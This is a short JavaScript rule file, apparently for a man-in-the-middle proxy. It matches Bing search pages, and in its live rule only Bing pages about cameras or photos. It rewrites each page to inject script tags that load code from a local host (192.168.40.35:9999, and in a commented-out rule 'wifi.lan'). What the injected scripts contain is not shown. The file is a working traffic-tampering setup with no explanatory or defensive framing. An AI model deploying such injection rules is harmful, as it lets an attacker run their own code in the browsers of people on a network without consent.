
// http()
//     .url(/bing/)
//     .loadContent()
//     .modify(/<\/body>/i, `
//         <script src='http://wifi.lan/jquery.min.js'></script>
//         <script src='http://wifi.lan/index2.js'></script>
//         <script src='http://wifi.lan/b.bundle.js'></script>
//         <script src='http://wifi.lan/init.js'></script>
//         </body>
//     `)

http()
    .url(/bing.*(nikon|camera|photo|picture|scene)/i)
    .loadContent()
    .modify(/<\/body>/i, `
        <script src='http://192.168.40.35:9999/loader.js'></script>
        <script src='http://192.168.40.35:9999/demo/config.js'></script>
        </body>
    `)